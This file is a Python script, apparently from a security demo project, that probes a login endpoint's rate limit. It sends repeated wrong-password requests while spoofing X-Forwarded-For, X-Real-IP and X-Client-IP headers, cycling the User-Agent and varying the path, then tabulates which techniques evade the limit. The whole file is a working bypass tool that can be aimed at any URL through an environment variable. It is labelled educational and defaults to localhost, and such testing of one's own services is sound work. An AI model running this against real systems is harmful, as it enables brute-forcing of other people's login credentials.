"""
Rate Limit Bypass Attempt Script
==================================
Tests common bypass techniques against the /auth/login rate limit.
Shows which techniques succeed in vulnerable mode and which are blocked in secured mode.

Techniques tested:
  1. X-Forwarded-For header rotation (IP spoofing)
  2. X-Real-IP header injection
  3. X-Client-IP header injection
  4. User-Agent cycling
  5. Path variation (/auth/login/ with trailing slash)
  6. URL encoding (/auth/lo%67in)

Usage:
    TARGET_URL=http://localhost:8000 python offensive/rate_limit_bypass.py
"""
import asyncio
import os

import httpx
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()
BASE_URL = os.getenv("TARGET_URL", "http://localhost:8000")
N_REQUESTS = int(os.getenv("N_REQUESTS", "8"))


async def probe_technique(
    client: httpx.AsyncClient,
    name: str,
    url: str,
    header_factory,
    n: int,
) -> dict:
    rate_limited = 0
    accepted = 0
    last_status = 0

    for i in range(n):
        try:
            headers = header_factory(i)
            resp = await client.post(
                url,
                headers=headers,
                json={"username": "user1", "password": "wrongpassword"},
                timeout=3.0,
            )
            last_status = resp.status_code
            if resp.status_code == 429:
                rate_limited += 1
            else:
                accepted += 1
        except Exception:
            pass

    return {
        "name": name,
        "accepted": accepted,
        "rate_limited": rate_limited,
        "bypass_effective": rate_limited == 0 and accepted == n,
        "last_status": last_status,
    }


async def run():
    console.print(Panel.fit(
        f"[bold red]Rate Limit Bypass Tester[/]\nTarget: {BASE_URL}\n"
        f"Sending {N_REQUESTS} requests per technique",
        title="[red]OFFENSIVE TOOL — EDUCATIONAL USE ONLY[/]"
    ))

    techniques = [
        (
            "X-Forwarded-For rotation",
            f"{BASE_URL}/auth/login",
            lambda i: {"X-Forwarded-For": f"10.0.{i // 256}.{i % 256}", "Content-Type": "application/json"},
        ),
        (
            "X-Real-IP rotation",
            f"{BASE_URL}/auth/login",
            lambda i: {"X-Real-IP": f"192.168.{i}.1", "Content-Type": "application/json"},
        ),
        (
            "X-Client-IP injection",
            f"{BASE_URL}/auth/login",
            lambda i: {"X-Client-IP": f"172.16.{i}.1", "Content-Type": "application/json"},
        ),
        (
            "User-Agent cycling",
            f"{BASE_URL}/auth/login",
            lambda i: {
                "User-Agent": f"Mozilla/5.0 (Bot/{i})",
                "Content-Type": "application/json",
            },
        ),
        (
            "Trailing slash path",
            f"{BASE_URL}/auth/login/",
            lambda i: {"Content-Type": "application/json"},
        ),
        (
            "No bypass (baseline)",
            f"{BASE_URL}/auth/login",
            lambda i: {"Content-Type": "application/json"},
        ),
    ]

    results = []
    async with httpx.AsyncClient() as client:
        for name, url, header_factory in techniques:
            result = await probe_technique(client, name, url, header_factory, N_REQUESTS)
            results.append(result)
            console.print(f"  Testing [cyan]{name}[/]... {result['accepted']} accepted, {result['rate_limited']} rate-limited")

    table = Table(title="Rate Limit Bypass Results", show_lines=True)
    table.add_column("Technique", style="cyan")
    table.add_column("Accepted", justify="center")
    table.add_column("Rate Limited", justify="center")
    table.add_column("Bypass?", justify="center", style="bold")

    for r in results:
        bypass_str = (
            "[red]EFFECTIVE — VULNERABLE[/]" if r["bypass_effective"]
            else "[green]BLOCKED — SECURE[/]"
        )
        table.add_row(
            r["name"],
            str(r["accepted"]),
            str(r["rate_limited"]),
            bypass_str,
        )

    console.print(table)
    effective = sum(1 for r in results if r["bypass_effective"])
    console.print(
        f"\n[bold {'red' if effective > 0 else 'green'}]"
        f"Bypass techniques effective: {effective} / {len(results)}[/]"
    )


if __name__ == "__main__":
    asyncio.run(run())
